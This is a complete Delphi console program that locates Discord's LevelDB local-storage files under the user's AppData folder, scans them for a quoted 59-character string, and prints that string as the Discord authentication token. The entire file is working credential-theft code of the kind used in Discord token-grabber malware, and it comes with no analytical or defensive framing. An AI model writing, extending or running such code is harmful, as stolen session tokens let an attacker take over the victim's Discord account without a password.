program Disc;

{$APPTYPE CONSOLE}

{$R *.res}

uses
  SysUtils, StrUtils, IOUtils;

var
  LocalStorage: String;
  Token, Content: String;
  SR: TSearchRec;
  P: LongInt;

begin
  try
    LocalStorage := IncludeTrailingBackslash(GetEnvironmentVariable('AppData'));
    if DirectoryExists(LocalStorage+'discordcanary') then
      LocalStorage := LocalStorage+'discordcanary'
    else
      LocalStorage := LocalStorage+'discord';
    LocalStorage :=LocalStorage+'\Local Storage\leveldb';
    Token:='';
    if DirectoryExists(LocalStorage) then Begin
      if FindFirst(LocalStorage+'\*.ldb', faAnyFile, SR) = 0 then Begin
        Repeat
          Content:=TFile.ReadAllText(LocalStorage+'\'+SR.Name);
          P:=Pos('"', Content);
          While P>0 do Begin
            Delete(Content, 1, P);
            P:=Pos('"', Content);
            if P=60 then Token:=LeftStr(Content, 59);
          end;
        until (Token<>'') or (FindNext(SR)<>0);
      end;
    end;

    Writeln('Token = "',Token,'"');
    Readln;

  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end.
